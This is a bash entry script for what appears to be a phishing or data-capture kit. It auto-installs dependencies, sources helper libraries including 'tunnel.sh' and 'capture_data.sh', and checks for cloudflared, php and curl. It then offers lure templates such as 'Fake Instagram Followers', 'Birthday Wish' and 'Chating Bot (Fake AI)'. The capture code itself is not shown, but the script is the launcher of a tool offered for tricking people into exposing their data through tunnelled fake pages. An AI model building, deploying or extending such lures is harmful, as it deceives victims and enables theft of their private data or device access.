#!/usr/bin/env bash
# Colors
red="$(printf '\033[1;31m')"
green="$(printf '\033[1;32m')"
orange="$(printf '\033[1;93m')"
blue="$(printf '\033[1;34m')"
cyan="$(printf '\033[1;36m')"
white="$(printf '\033[1;37m')"
redbg="$(printf '\033[1;41m')"
nocolor="$(printf '\e[0m')"

# FIX #12: symlink-safe SCRIPT_DIR
SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)

trap terminate INT

# ========== បន្ថែមមុខងារនេះ ==========
# Function to install lolcat automatically
install_lolcat() {
    if ! command -v lolcat &> /dev/null; then
        echo "${cyan}[${orange}!${cyan}]${white} lolcat not found. Installing...${nocolor}"
        
        # Detect OS
        if [[ -f /etc/os-release ]]; then
            . /etc/os-release
            OS=$ID
        elif command -v termux-setup &> /dev/null; then
            OS="termux"
        else
            OS=$(uname -s)
        fi

        case $OS in
            ubuntu|debian|kali|linuxmint)
                sudo apt update && sudo apt install lolcat -y
                ;;
            termux)
                pkg update && pkg install ruby -y
                gem install lolcat
                ;;
            darwin|macos)
                brew install lolcat
                ;;
            centos|fedora|rhel)
                sudo yum install epel-release -y
                sudo yum install lolcat -y
                ;;
            arch|manjaro)
                sudo pacman -S lolcat
                ;;
            *)
                echo "${red}[✖] Cannot install lolcat automatically. Please install manually.${nocolor}"
                echo "Try: gem install lolcat"
                exit 1
                ;;
        esac

        # Check if installation was successful
        if command -v lolcat &> /dev/null; then
            echo "${green}[✓] lolcat installed successfully!${nocolor}"
            sleep 2
        else
            echo "${red}[✖] Failed to install lolcat. Please install manually.${nocolor}"
            exit 1
        fi
    fi
}
# ========================================

# Load Source lib/
load_lib() {
    local libs=("check_net.sh" "dis_detect.sh" "banners.sh" "pkage_check.sh" "setup_files.sh" "tunnel.sh" "capture_data.sh" "others.sh")
    for lib in "${libs[@]}"; do
        if [ -f "$SCRIPT_DIR/lib/$lib" ]; then
            source "$SCRIPT_DIR/lib/$lib"
        else
            echo "${cyan}[${red}✖${cyan}]${red} Error:${white} Missing library ${green}$lib${white} at $SCRIPT_DIR/lib/"
            exit 1
        fi
    done
}

# Load Tools
load_tools() {
    # Check and install lolcat if missing
    install_lolcat
    
    { clear; small_banner | lolcat; banner2; echo; }
    print_status "${white}Internet Connection" "$int_status"
    check_requirements "lolcat" "jq" "php" "curl" "wget" "cloudflared"
    sleep 1
}

# Main Menu
main_menu() {
    { clear; banner | lolcat; banner2; echo; }
cat << EOF
    ${green}<<------ ${white}Select a Templates ${green}------>>${nocolor}

    ${cyan}[${orange}1${cyan}]${white} YouTube Live TV
    ${cyan}[${orange}2${cyan}]${white} Birthday Wish
    ${cyan}[${orange}3${cyan}]${white} Secret Message
    ${cyan}[${orange}4${cyan}]${white} Fake Instagram Followers
    ${cyan}[${orange}5${cyan}]${white} Chating Bot (Fake AI)
    ${cyan}[${red}6${cyan}]${red} Exit ${nocolor}

EOF
    read -p "    ${cyan}[${green}+${cyan}]${white} Select an options:${green} " templates

    case $templates in
        1) setup-youtube-tv ;;
        2) setup_birthday_wish ;;
        3) secret_msg ;;
        4) fake_insta_follower ;;
        5) chating_bot ;;
        6) exit_msg ;;
        *) invalid_options ;;
    esac
}

load_lib
kill_pid
init_setup
load_tools
main_menu